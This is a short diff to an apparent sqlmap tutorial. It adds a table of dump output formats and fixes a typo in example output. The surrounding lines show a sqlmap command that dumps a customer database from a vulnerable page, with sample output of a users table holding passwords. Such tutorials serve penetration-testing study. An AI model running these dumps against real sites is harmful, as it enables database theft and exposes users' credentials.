@@ -143,11 +143,21 @@ sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D custo
 ```
 - `--dump`: Extracts all data from the table
 - `--dump-format=CSV`: Outputs results in CSV format
+- SQLmap supports multiple output formats for data dumps. Choose the one that best fits your reporting or analysis needs:
+
+| Format | Description                             | Extension |
+|--------|-----------------------------------------|-----------|
+| CSV    | Comma-separated, ideal for Excel or scripts | `.csv`    |
+| SQL    | Full schema + data dump, reconstructable   | `.sql`    |
+| HTML   | Easy-to-read formatted output in browser   | `.html`   |
+| XML    | Structured data for parsing or integration | `.xml`    |
+| JSON   | Lightweight structured data, API-friendly  | `.json`   |
+
 
 **Output Example**
 ```
 Database: customer_db
-Table: userz
+Table: users
 [3 entries]
 +---------+---------+-----------------------------------------------+-----------+
 | id_user | level   | password                                      | username  |
